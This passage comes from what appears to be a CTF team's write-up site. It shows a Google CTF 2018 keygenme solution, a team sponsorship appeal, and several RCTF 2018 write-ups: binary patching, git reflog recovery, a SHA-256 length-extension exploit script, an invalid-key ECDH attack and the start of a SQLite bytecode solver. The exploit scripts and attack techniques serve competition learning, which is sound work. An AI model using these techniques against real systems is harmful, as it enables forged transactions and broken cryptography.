= 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x48\\x83\\xc2\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554e3b, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x48\\x83\\xc2\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555555540, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x48\\x8b\u0026#34;, iov_len=2}], 1, [{iov_base=0x5555555559e9, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x48\\x8b\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555555aed, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x48\\x8b\\x85\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554b67, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x48\\x8d\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555554b71, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x48\\xc1\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555554845, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x5d\\x41\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555555c1b, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x5e\\x48\\x89\u0026#34;, iov_len=3}], 1, [{iov_base=0x5555555547c5, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x89\\x45\\xd8\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554cc8, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x00\u0026#34;, iov_len=2}], 1, [{iov_base=0x5555555558bd, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x0a\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555555186, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x12\\x01\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554d25, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x45\\xbc\u0026#34;, iov_len=3}], 1, [{iov_base=0x5555555552f6, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x45\\xc4\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554e22, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x45\\xe0\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554feb, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x45\\xf4\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555554934, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x4d\\xc8\u0026#34;, iov_len=3}], 1, [{iov_base=0x5555555555f1, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x55\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555554e32, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x55\u0026#34;, iov_len=2}], 1, [{iov_base=0x555555554e61, iov_len=2}], 1, 0) = 2 process_vm_writev(26117, [{iov_base=\u0026#34;\\x8b\\x55\\xdc\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555555482, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\x90\\x5d\\xc3\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555555744, iov_len=3}], 1, 0) = 3 process_vm_writev(26117, [{iov_base=\u0026#34;\\xc1\\xe8\\x08\u0026#34;, iov_len=3}], 1, [{iov_base=0x555555555b0f, iov_len=3}], 1, 0) = 3 We parsed this output using an helper python script to generate IDC valid patching instructions we later copy-pasted in the IDA cmd-line.\nimport re f = file(\u0026#34;./patches\u0026#34;) patches = f.read().split(\u0026#34;\\n\u0026#34;)[:-2] for l in patches: # print l addr = int(l[l.index(\u0026#34;iov_base=\u0026#34;,45)+9:l.index(\u0026#34;iov_base=\u0026#34;,45)+9+14],16)-0x555555554000 patch_len = int(l[l.index(\u0026#34;iov_len=\u0026#34;)+8:l.index(\u0026#34;iov_len=\u0026#34;)+8+1]) patch = l[l.index(\u0026#34;iov_base=\u0026#34;)+10:l.index(\u0026#34;iov_base=\u0026#34;)+10+(patch_len*4)] patch_s = patch.split(\u0026#34;\\\\\u0026#34;) for j in xrange(patch_len): print \u0026#34;patch_byte(\u0026#34;+hex(addr+j)+\u0026#34;, 0\u0026#34;+patch_s[j+1] +\u0026#34;);\u0026#34; Which gave us:\nmarcof:(~/googlectf/keygenme)$ python patcher.py patch_byte(0xd56, 0x01); patch_byte(0xd57, 0xca); patch_byte(0x1549, 0x01); patch_byte(0x154a, 0xca); patch_byte(0x154b, 0x01); patch_byte(0x12b6, 0x01); . . main3 reversing # This binary takes as input a 5byte validation code and a 32byte serial key. The serial key is shuffled according to some algorithm we didn\u0026rsquo;t want to reverse. The scrumbled key is then compared with another value whose generation also we absolutely didn\u0026rsquo;t want to reverse, surely something depending on the 5byte validation code. With a black box apporach we were able to both obtain the xoring key (inputing a \u0026ldquo;0\u0026quot;x32 serial) and the byte mappings (find them in the final exploit). The only thing we missed now was a way to obtain the comparing value generated from the validation code.\nSolution # The fastest way for us was to patch out the final strcmp() and substitute it with a puts() in our child binary (main3). For unknown reasons running main3 exlusively was not working so we rapidly produced a patched main version calling execve on it.\n// Patch of main binary to execve our patched main3 patch_byte(0x603da2,\u0026#39;m\u0026#39;); patch_byte(0x603da3,\u0026#39;a\u0026#39;); patch_byte(0x603da4,\u0026#39;i\u0026#39;); patch_byte(0x603da5,\u0026#39;n\u0026#39;); patch_byte(0x603da6,\u0026#39;3\u0026#39;); patch_byte(0x603da7,0x00); Our approach now is:\nwe get the 5 byte validation code from the server we pass it to our patched version of the binary the inserted puts() gives us the comparing value we apply the byte mappings and xoring key on this value we sent it back to the server we get the flag no actually repeat 100 times we get the flag Final exploit # from pwn import * ## this looks stupid but at the time we thought the mapping was far more complex maps = {0:30,1:1,2:28,3:3,4:26,5:5,6:24,7:7,8:22,9:9,10:20,11:11,12:18,13:13,14:16,15:15, 16:14,17:17,18:12,19:19,20:10,21:21,22:8,23:23,24:6,25:25,26:4,27:27,28:2,29:29,30:0,31:31} key = 0x00112233445566778899aabbccddeeff def map_key(otp): arr = [\u0026#34;a\u0026#34;] * 32 b = key^otp b = hex(b)[2:].rjust(32,\u0026#39;0\u0026#39;) for i,c in enumerate(b): # print i,c arr[maps[i]] = c # print \u0026#34;UNAMPPED: \u0026#34; + b return \u0026#34;\u0026#34;.join(arr) r = remote(\u0026#39;keygenme.ctfcompetition.com\u0026#39;,1337) count = 0 while True: num = r.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] if(\u0026#39;CTF{\u0026#39; in num): print \u0026#34;FLAG?: \u0026#34; + num print \u0026#34;COUNT: \u0026#34; + str(count) break count += 1 p = process(\u0026#39;./main\u0026#39;) p.sendline(num+\u0026#34;0\u0026#34;*32) xored = p.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] p.close() # print \u0026#34;CODE: \u0026#34; + num # print \u0026#34;XORED: \u0026#34; + xored result = map_key(int(xored,16)) # print \u0026#34;MAPPED: \u0026#34; + result r.sendline(result) r.recvuntil(\u0026#34;OK\\n\u0026#34;) Attachments # The original challenge files here\nFinal exploit, patched main and main3 binaries here\n","date":"27 June 2018","externalUrl":null,"permalink":"/writeups/2018-06-27-google-ctf-2018-keygenme/","section":"","summary":"","title":"KEYGENME - Google CTF 2018","type":"writeups"},{"content":"","date":"27 June 2018","externalUrl":null,"permalink":"/tags/reversing/","section":"Tags","summary":"","title":"Reversing","type":"tags"},{"content":"We are mhackeroni, an Italian ethical hacking team \u0026ndash; a joint collaboration between four major universities and their teams: Polytechnic of Milan, University of Venice Ca\u0026rsquo; Foscari, University of Padua, and Sapienza University of Rome.\nOn May 12-13, our \u0026ldquo;mega-team\u0026rdquo; scored second place on the DEF CON Capture The Flag qualifiers over 600 teams from all over the world. This result gained us access to the DEF CON CTF finals, on August 9-12, in Las Vegas, USA. DEF CON is the most renowned hacking and cybersecurity venue of the world. It was even featured in popular movies and TV shows such as X-Files, The Signal, and the recent Mr. Robot. DEF CON\u0026rsquo;s main highlight is surely the Capture the Flag competition, where only a handful of the best teams from academia and industry compete for glory. And this year we\u0026rsquo;ll be one of them!\nWe therefore think that our presence in the finals is a great opportunity for visibility: last year attendees were over 25.000, and everyone\u0026rsquo;s eyes are pointed to the few competing teams.\nHowever, competing on the finals is a tremendous team effort: mhackeroni are over 35 of the most skilled security researchers in Italian universities, and everyone\u0026rsquo;s participation is required to compete with other, similarly-sized teams. Team organization and communication are fundamental to succeed: that\u0026rsquo;s why we need financial help and sponsors to get the whole team to Las Vegas. What we can offer in exchange is the great visibility of supporting a DEF CON CTF finalist team.\nWe propose the following sponsorship levels:\nSilver - We\u0026rsquo;ll feature you on our social networks; people on the DEF CON game arena will put your sticker on their laptop. Gold - Everything in Silver, plus a small logo on our t-shirt. We\u0026rsquo;ll send you the CVs of every team member: BSc, MSc, PhD, and postgraduate students in cybersecurity. Platinum - Everything in Silver, plus logo on our hoodie. We\u0026rsquo;ll send you the CVs of every team member: BSc, MSc, PhD, and postgraduate students in cybersecurity. We\u0026rsquo;re of course open to any alternative proposal. Get in touch with us! Send us an email at info@mhackeroni.it\nmhackeroni in the news\nPolitecnico di Milano: https://www.deib.polimi.it/eng/.. Universit√† Ca‚Äô Foscari Venezia: https://www.unive.it/.. Universit√† La Sapienza Roma: https://www.uniroma1.it/it/notizia/.. Universit√† di Padova: http://www.unipd.it/ilbo/.. Il Giorno: Hacker s√¨, ma con un‚Äôetica - Dal Politecnico a Las Vegas con i ‚Äúmhackeroni‚Äù https://www.ilgiorno.it/milano/.. Venezia Today: http://www.veneziatoday.it/attualita/.. University Equipe: https://universityequipe.com/.. ","date":"4 June 2018","externalUrl":null,"permalink":"/news/2018-06-04-defconctf-finals-call-for-sponsors/","section":"","summary":"","title":"DEF CON 26 CTF - Call for Sponsors","type":"news"},{"content":"This is the collection of all of our write-ups for rctf2018. Our final result was an incredible 3rd place !!\nIndex # Compiler - Git - CPUSHOP - ECDH - SQL - babyre2 - Cats - Cats Rev. 2 - No-js - babyheap - rBlog 2018 - rBlog 2018 v2 - 520gift - Number magic - Simulator - stringer - Simple vm - Babyre - Sign - AMP - RNote3 - Simple re - RNote4 - backdoor - r-cursive\nComments section # Compiler # Attachment(original link)\nWe are given an ISO image of a bootable Arch Linux distro.\nIn \u0026ldquo;/home\u0026rdquo; there was a .c file. Being the challenge name \u0026ldquo;compiler\u0026rdquo;, we compiled and executed it. Besides printing the expected \u0026ldquo;hello world\u0026rdquo; message, the binary also creates a backdoor file.\nGrepping for \u0026ldquo;backdoor\u0026rdquo; we find that libc.a matches. Further grepping for \u0026ldquo;rctf\u0026rdquo; inside its objects files, we notice that libc_start.o matches.\nInside libc_start we see a series of hints and by comparing the function with the original archlinux libc.a, we notice that a number of new basic blocks were added.\nWe debugged the application to analyze the modified code. There was a loop that was writing in a buffer, so we dumped its contents right after all the computations were performed. This way we obtained the first part of the flag: \u0026ldquo;RCTF{Without\u0026rdquo;.\nMeanwhile, a hint for compiler was released, saying \u0026ldquo;try \u0026quot;flag\u0026quot; command\u0026rdquo;. By issuing the \u0026ldquo;flag\u0026rdquo; command in bash, we see unexpected strings on the terminal. \u0026ldquo;flag\u0026rdquo; was neither an alias, nor a binary in the system, so after some thoughts we decided to check out \u0026ldquo;bash\u0026rdquo;. Indeed \u0026ldquo;bash\u0026rdquo; was re-compiled statically, so we assumed it had been tampered. In fact we found that a set of new builtin commands were added to bash, namely \u0026ldquo;prince\u0026rdquo;, \u0026ldquo;queen\u0026rdquo;, \u0026ldquo;flag\u0026rdquo; together with a set of other aliases.\nEach of those custom builtins were printing some stuff using the \u0026ldquo;print_flag_string\u0026rdquo; function. This function xor\u0026rsquo;s each character with 0x03, so we scripted a bit to extract all the strings:\nWho has been sitting in my chair? Who has been eating from my plate? Who has been eating my bread? Who has been eating my vegetables? Who has been eating with my fork? Who has been drinking from my cup? Oh good heaven! This child is beautiful! So Snow White lived happily with the dwarves. So Snow White lived happily with the dwarves. So Snow White lived happily with the dwarves. So Snow White lived happily with the dwarves. So Snow White lived happily with the dwarves. Good heavens, where am I? Oh, my dear, you saved me! Look at here, I stole this from the queen's pocket! \u0026quot;The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526\u0026quot; \u0026quot;The flag is [part1, plain(hash1), plain(hash2), plain(hash3), '}').join('')\u0026quot; I know the queen hijacked me by a function which used this hash algorithm! The evil queen was banished from the land forever and the prince and Snow White lived happily ever after. Mirror, mirror, on the wall, Who in this land is fairest of all? You, my queen, are fair; it is true. But Snow White, beyond the mountains With the seven dwarves, Is still a thousand times fairer than you. I'll easily get rid of my apples. Here, I'll give you one of them. Look, I'll cut the apple in two. You eat half and I shall eat half. White as snow, red as blood, black as ebony wood! The dwarves shall never awaken you. OK, you're right. But you cannot wake her up unless you know how the Snow White dead. Give me the executable name of 'flag': Let me have the coffin. I will give you anything you want for it. Who can wake the Snow White up? Call him! We can see that a few strings give some hints regarding the flag:\nThe flag is [part1, plain(hash1), plain(hash2), plain(hash3), '}').join('') The hashes of remaining flag is: 13340610174042144018, 95741437967718225, 484886919005526 I know the queen hijacked me by a function which used this hash algorithm! The last string hints to the hashing algorithm used by bash to manage the builtin aliases. Normally bash uses the \u0026ldquo;khash\u0026rdquo; algorithm, but by inspecting the custom \u0026ldquo;bash\u0026rdquo; binary, we noticed that the hash function \u0026ldquo;hash_string\u0026rdquo; was modified.\nWe reversed the customized hashing algorithm, and since the hashes were known, we bruteforced all possible combinations of strings using a charset of [a-zA-Z0-9_] to get the expected hashes.\nWe had to bruteforce 8+ characters at a time, so the only feasible solution is a meet in the middle algorithm.\nWe cached 4 characters worth of hashes and then bruteforced the rest computing the reverse hash and looking for a match in the hash.\nWe didn\u0026rsquo;t find any collision and later the author told us that he modified the standard bash hashing algorithm to avoid collisions.\nThis way we obtained the final part of the flag. The flag was \u0026ldquo;RCTF{Without_no_seAms_NoR_nEeDlework}\u0026rdquo;.\n#include \u0026lt;cstring\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;map\u0026gt; using namespace std; map\u0026lt;unsigned long long, string\u0026gt; m; unsigned long long mhash(string s) { unsigned long long result = 0; unsigned long long p = 139; for (auto v : s) { result = (p * result) ^ (v); } return result; } unsigned long long rhash(string s, unsigned long long start) { // 139^-1 mod 2^64 unsigned long long p = 4246732448623781667ull; unsigned long long result = start; for (auto v : s) { result = (p * (result ^ v)); } return result; } string rev(string s) { string t = \u0026#34;\u0026#34;; for (auto c : s) t = (c) + t; return t; } // RCTF{With_no_seAms_NoR_nEeDlework} /*Dlekrow} */ char printable[] = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_\u0026#34;; string w = \u0026#34;0123\u0026#34;; string w1 = \u0026#34;01234\u0026#34;; int main() { cout \u0026lt;\u0026lt; \u0026#34;inv \u0026#34; \u0026lt;\u0026lt; 4246732448623781667ull * 139ull \u0026lt;\u0026lt; endl; for (int i = 0; i \u0026lt;= strlen(printable); i++) { w[0] = printable[i]; cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; for (int j = 0; j \u0026lt;= strlen(printable); j++) { w[1] = printable[j]; for (int k = 0; k \u0026lt;= strlen(printable); k++) { w[2] = printable[k]; for (int l = 0; l \u0026lt;= strlen(printable); l++) { w[3] = printable[l]; auto z = mhash(w); if (m.find(z) != m.end()) { cout \u0026lt;\u0026lt; \u0026#34;collision \u0026#34; \u0026lt;\u0026lt; w \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; m[z] \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } m[z] = w; } } } } for (int i = 0; i \u0026lt;= strlen(printable); i++) { w1[0] = printable[i]; cout \u0026lt;\u0026lt; i \u0026lt;\u0026lt; endl; for (int j = 0; j \u0026lt;= strlen(printable); j++) { // cout \u0026lt;\u0026lt; j \u0026lt;\u0026lt; endl; w1[1] = printable[j]; for (int k = 0; k \u0026lt;= strlen(printable); k++) { w1[2] = printable[k]; for (int l = 0; l \u0026lt;= strlen(printable); l++) { w1[3] = printable[l]; for (int s = 0; s \u0026lt;= strlen(printable); s++) { w1[4] = printable[s]; //for (int t = 0; t \u0026lt;= strlen(printable); t++) { // w1[5] = printable[t]; // for (int u = 0; u \u0026lt;= strlen(printable); u++) { // w1[6] = printable[u]; auto z = rhash(w1, 13340610174042144018ull); if (m.find(z) != m.end()) cout \u0026lt;\u0026lt; \u0026#34;part 2 \u0026#34; \u0026lt;\u0026lt; (m.find(z)-\u0026gt;second) \u0026lt;\u0026lt; rev(w1) \u0026lt;\u0026lt; endl; z = rhash(w1, 95741437967718225ull); if (m.find(z) != m.end()) cout \u0026lt;\u0026lt; \u0026#34;part 3 \u0026#34; \u0026lt;\u0026lt; (m.find(z)-\u0026gt;second) \u0026lt;\u0026lt; rev(w1) \u0026lt;\u0026lt; endl; z = rhash(w1, 484886919005526ull); if (m.find(z) != m.end()) cout \u0026lt;\u0026lt; \u0026#34;part 4 \u0026#34; \u0026lt;\u0026lt; (m.find(z)-\u0026gt;second) \u0026lt;\u0026lt; rev(w1) \u0026lt;\u0026lt; endl; // } //} } } } } } } Git # Attachment (original link)\nWe are given a git repository\nLet\u0026rsquo;s explore the logs\nchqma@computer:~/ctf/rctf/git$ git log commit 22d3349a5c6fe45758daba276108137382a01caa (HEAD -\u0026gt; master, develop) Author: zsx \u0026lt;zsx@zsxsoft.com\u0026gt; Date: Sun May 13 12:54:34 2018 +0800 Initial Commit Nothing interesting\u0026hellip;\nCheck .git\nchqma@computer:~/ctf/rctf/git$ ls -lar total 16 -rw-r--r-- 1 chqma chqma 11 mag 13 06:54 HelloWorld.txt drwxr-xr-x 8 chqma chqma 4096 mag 19 08:18 .git drwxr-xr-x 3 chqma chqma 4096 mag 19 08:18 .. drwxr-xr-x 3 chqma chqma 4096 mag 13 06:55 . chqma@computer:~/ctf/rctf/git$ ls .git/ branches config HEAD index logs ORIG_HEAD COMMIT_EDITMSG description hooks info objects refs Ok COMMIT_EDITMSG and description look suspicious, let\u0026rsquo;s check them out\nchqma@computer:~/ctf/rctf/git$ cd .git chqma@computer:~/ctf/rctf/git/.git$ cat description Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the repository. chqma@computer:~/ctf/rctf/git/.git$ cat COMMIT_EDITMSG Revert # ËØ∑‰∏∫ÊÇ®ÁöÑÂèòÊõ¥ËæìÂÖ•Êèê‰∫§ËØ¥Êòé„ÄÇ‰ª• \u0026#39;#\u0026#39; ÂºÄÂßãÁöÑË°åÂ∞ÜË¢´ÂøΩÁï•ÔºåËÄå‰∏Ä‰∏™Á©∫ÁöÑÊèê‰∫§ # ËØ¥ÊòéÂ∞Ü‰ºöÁªàÊ≠¢Êèê‰∫§„ÄÇ # # ‰Ωç‰∫éÂàÜÊîØ rctf # Ë¶ÅÊèê‰∫§ÁöÑÂèòÊõ¥Ôºö # Âà†Èô§Ôºö flag.txt # So the flag was commited by \u0026ldquo;mistake\u0026rdquo;, let\u0026rsquo;s find the commit hash with git reflog\nchqma@computer:~/ctf/rctf/git/.git$ git reflog 22d3349 (HEAD -\u0026gt; master, develop) HEAD@{0}: checkout: moving from develop to master 22d3349 (HEAD -\u0026gt; master, develop) HEAD@{1}: rebase -i (finish): returning to refs/heads/develop 22d3349 (HEAD -\u0026gt; master, develop) HEAD@{2}: rebase -i (start): checkout 22d3349 f671986 HEAD@{3}: checkout: moving from master to develop 22d3349 (HEAD -\u0026gt; master, develop) HEAD@{4}: checkout: moving from develop to master f671986 HEAD@{5}: checkout: moving from master to develop 22d3349 (HEAD -\u0026gt; master, develop) HEAD@{6}: checkout: moving from rctf to master f671986 HEAD@{7}: commit: Revert f4d0f6d HEAD@{8}: commit: Flag 22d3349 (HEAD -\u0026gt; master, develop) HEAD@{9}: checkout: moving from master to rctf 22d3349 (HEAD -\u0026gt; master, develop) HEAD@{10}: commit (initial): Initial Commit Now just check out the right commit and we are done\nchqma@computer:~/ctf/rctf/git/.git$ cd .. chqma@computer:~/ctf/rctf/git$ git checkout f4d0f6d Note: checking out \u0026#39;f4d0f6d\u0026#39;. You are in \u0026#39;detached HEAD\u0026#39; state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b \u0026lt;new-branch-name\u0026gt; HEAD is now at f4d0f6d... Flag chqma@computer:~/ctf/rctf/git$ ls flag.txt HelloWorld.txt chqma@computer:~/ctf/rctf/git$ cat flag.txt RCTF{gIt_BranCh_aNd_l0g} CPUSHOP # Overview # We are given a python source code for the app\nit generates a signkey\nsignkey = \u0026#39;\u0026#39;.join([random.choice(string.letters+string.digits) for _ in xrange(random.randint(8,32))]) We can choose among many cpus with different price tag or the flag\nitems = [(\u0026#39;Intel Core i9-7900X\u0026#39;, 999), ... ,(\u0026#39;Flag\u0026#39;, 99999)] However we don\u0026rsquo;t have enough money for the flag\nmoney = random.randint(1000, 10000) If we order a product we are given a signed order like this one\nproduct=Intel Core i9-7900X\u0026amp;price=999\u0026amp;timestamp=1526709982568192\u0026amp;sign=d37055b05664f5563062aa45510ad8d779d8cb2c103bdf2791dfd5ef6c44927d\nIn the pay function it checks that the signature of the order is correct\nsp = payment.rfind(\u0026#39;\u0026amp;sign=\u0026#39;) if sp == -1: print \u0026#39;Invalid Order!\u0026#39; return sign = payment[sp+6:] try: sign = sign.decode(\u0026#39;hex\u0026#39;) except TypeError: print \u0026#39;Invalid Order!\u0026#39; return payment = payment[:sp] signchk = sha256(signkey+payment).digest() print(repr(payment)) print(signchk.encode(\u0026#39;hex\u0026#39;)) print(len(signkey)) if signchk != sign: print \u0026#39;Invalid sign!\u0026#39; return If we set product to Flag and we have enough money the server will send us the flag\nfor k,v in parse_qsl(payment): if k == \u0026#39;product\u0026#39;: product = v elif k == \u0026#39;price\u0026#39;: try: price = int(v) except ValueError: print \u0026#39;Invalid Order!\u0026#39; return if money \u0026lt; price: print \u0026#39;Go away you poor bastard!\u0026#39; return Signature # The signature algorithm is simple\npayment = \u0026#39;product=%s\u0026amp;price=%d\u0026amp;timestamp=%d\u0026#39; % (items[n][0], items[n][1], time.time()*1000000) sign = sha256(signkey+payment).hexdigest() It uses sha256 and the secret is at the beginning, so it is vulnerable to a hash extension attack.\nThere are many tools for hash extension, we chose https://github.com/iagox86/hash_extender because it is kind of reliable.\nPay # The pay function doesn\u0026rsquo;t check for:\nrepeated keys the order of the keys. if the keys are valid It will always keep the latest value.\nfor k,v in parse_qsl(payment): if k == \u0026#39;product\u0026#39;: product = v elif k == \u0026#39;price\u0026#39;: try: price = int(v) except ValueError: print \u0026#39;Invalid Order!\u0026#39; return Idea # Append \u0026amp;product=Flag to a cheap product Append \u0026amp;price=1 to a Flag order We choose the first route because it seems more reliable\nSolving # The last challenge is the length of the secret which is randomized at the start.\nWe just loop through every possible length\nimport pwn import subprocess import random pwn.context(log_level=\u0026#39;DEBUG\u0026#39;) with pwn.remote(\u0026#39;cpushop.2018.teamrois.cn\u0026#39;, 43000) as r: # with pwn.process([\u0026#39;python\u0026#39;, \u0026#39;cpushop.py\u0026#39;]) as r: for i in range(8, 33): r.recvuntil(\u0026#39;Command\u0026#39;) r.sendline(\u0026#39;2\u0026#39;) r.recvuntil(\u0026#39;Product ID\u0026#39;) r.sendline(\u0026#39;0\u0026#39;) r.recvuntil(\u0026#39;Your order:\\n\u0026#39;) s = r.recvline() ### get order and signature d, s = s.strip().split(\u0026#39;\u0026amp;sign\u0026#39;) ### get hash extended string l = subprocess.check_output([ \u0026#39;/home/chqma/ctf/hash_extender/hash_extender\u0026#39;, \u0026#39;-d\u0026#39;, d, \u0026#39;-s\u0026#39;, s, \u0026#39;-a\u0026#39;, \u0026#39;\u0026amp;product=Flag\u0026#39;, \u0026#39;-f\u0026#39;, \u0026#39;sha256\u0026#39;, \u0026#39;-l\u0026#39;, str(i), \u0026#39;--out-data-format\u0026#39;, \u0026#39;raw\u0026#39; ]) print(l) head = \u0026#39;New signature: \u0026#39; s = l[l.find(head) + len(head):l.find(\u0026#39;\\n\u0026#39;, l.find(head))] d = l[l.find(\u0026#39;New string: \u0026#39;) + len(\u0026#39;New string: \u0026#39;):l.find(\u0026#39;\\n\u0026#39;, l.find(\u0026#39;New string: \u0026#39;))] r.recvuntil(\u0026#39;Command\u0026#39;) r.sendline(\u0026#39;3\u0026#39;) r.sendline(\u0026#39;{}\u0026amp;sign={}\u0026#39;.format(d, s)) ### profit r.interactive() ECDH # Overview # A crypto challenge\nECDH -\u0026gt; elliptic curve diffie hellman ECDH\nWe can iteract with Alice and Bob\nChoosing about will tell us the curve parameters and the symmetric key algorithm that will use the shared secret from the exchange\nchqma@computer:~$ nc ECDH.2018.teamrois.cn 42000 Welcome to my GETFLAG system 1. visit Alice 2. visit Bob 3. about input here: 3 ECDH.....https://github.com/esxgx/easy-ecc..secp128r1..AES...EBC....... We can ask Alice for the public keys, but also set Bob\u0026rsquo;s public key\nHello nobody...I\u0026#39;m Alice... you can: 1. ask for flag 2. ask me about my public key 3. ask me about Bob\u0026#39;s public key 4. tell me Bob\u0026#39;s public key We can do the same with Bob\nHello nobody...I\u0026#39;m Bob... you can: 1. ask for flag 2. ask me about my public key 3. ask me about Alice\u0026#39;s public key 4. tell me Alice\u0026#39;s public key If we ask Bob for the flag he will use ECDH to share an AES key with Alice and then send an encrypted flag to Alice\nProtocol # In ECDH the shared secret x is the x coordinate of the point dA*dB*G where dA and dB are numbers (the private secret of Alice and Bob) and G is a fixed generator point of the curve.\nIt is computed combining Alice\u0026rsquo;s private key with Bob public key and vice versa.\nBob and Alice public keys are dB*G and dA*G.\nSince Bob is encrypting the message, his computed secret will be dB * PublicAlice, that is dB * dA * G if we don\u0026rsquo;t change Alice\u0026rsquo;s public key.\nMain idea # We notice that if we set Alice\u0026rsquo;s public key to something we know like 2 * G, Bob\u0026rsquo;s shared key will be db * 2 * G, that is PublicBob * 2.\nThe shared key will depend only on public data.\nWe congecture that\naes128 is used since the curve is 128bit there is no key derivation function Solution # Get curve parameters Get Bob public key Set Alice public key to 2*G Ask Bob for flag (msg) Get encrypted flag from Alice Fire up SageMath from Crypto.Cipher import AES # setup F = GF(0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFF) p = 0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFF a = 0xFFFFFFFDFFFFFFFFFFFFFFFFFFFFFFFC b = 0xE87579C11079F43DD824993C2CEE5ED3 G = (0x161FF7528B899B2D0C28607CA52C5B86, 0xCF5AC8395BAFEB13C02DA292DDED7A83) n = 0xFFFFFFFE0000000075A30D1B9038A115 h = 1 s128r1 = EllipticCurve(F, (a, b)) G = s128r1(G) # copied from terminal bx = 0x2d5381d8a0fdf4ca9afa662726aed8b2 g2 = \u0026#39;038151a0c6b92171db199db84be753a97e\u0026#39; msg = \u0026#39;aa19f4de6c487c333855a2fab0e95a8a44f143760283eabdf985bde4fad89067\u0026#39; ss = uncompress(bx, 1) * 2 ak = \u0026#39;{:016x}\u0026#39;.format(int(ss[0])) print(len(ak)) print(len(msg.decode(\u0026#39;hex\u0026#39;))) cp = AES.new(ak.decode(\u0026#39;hex\u0026#39;), mode=AES.MODE_ECB,) cp.decrypt(msg.decode(\u0026#39;hex\u0026#39;)) # \u0026#39;RCTF{UgotTHEpoint}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\u0026#39; ### Helper functions def uncompress(px, s): f = x**3 +a*x + b y = int(pow(int(f(x=px)), int((p+1)/4), p)) if s == 1: return s128r1((px, p-y)) else: return s128r1((px, y)) SQL # Overview # Novel reverse challenge\nWe are given log file\nSQLite version 3.8.2 2013-12-06 14:53:30 Enter \u0026#34;.help\u0026#34; for instructions Enter SQL statements terminated with a \u0026#34;;\u0026#34; sqlite\u0026gt; explain [redacted] 0|Trace|0|0|0||00| 1|Goto|0|93|0||00| ... explain is an sqlite statement which tells the dbms to output the underlying vm commands for a given query\nI found a couple of interesting articles about explain and SQLite‚Äôs ‚ÄúVirtual DataBase Engine‚Äù\nhttps://medium.com/@JasonWyatt/squeezing-performance-from-sqlite-explaining-the-virtual-machine-2550ef6c5db https://stackoverflow.com/questions/17663379/how-to-understand-sqlite-explain-query-plan-result https://github.com/endlesssoftware/sqlite3/blob/master/vdbe.c The most important is the official vdbe opcode documentation https://www.sqlite.org/opcode.html\nSolution # We just have to implement a basic vdbe interpreter\nWe made some educated guesses to simplify our work\nonly implemented Goto,OpenRead,String8,Integer,Function (limited to substr),Ne and Halt the first part of the code sets up a lookup table the second part picks a character of the flag at a time and compares it with the right value Important pattern # Select XXXX-th character to compare with character in register BBBB, jump to HALT if not equal\n98|String8|0|BBBB|0|f|00| 139|Integer|XXXX|AAAA+1|0||00| 140|Integer|1|AAAA+2|0||00| 52|Column|0|0|AAAA||00| 53|Function|6|AAAA|1|substr(3)|03| 54|Ne|BBBB|90|1||6a| Solver code # from logging import log import logging logi = lambda msg: 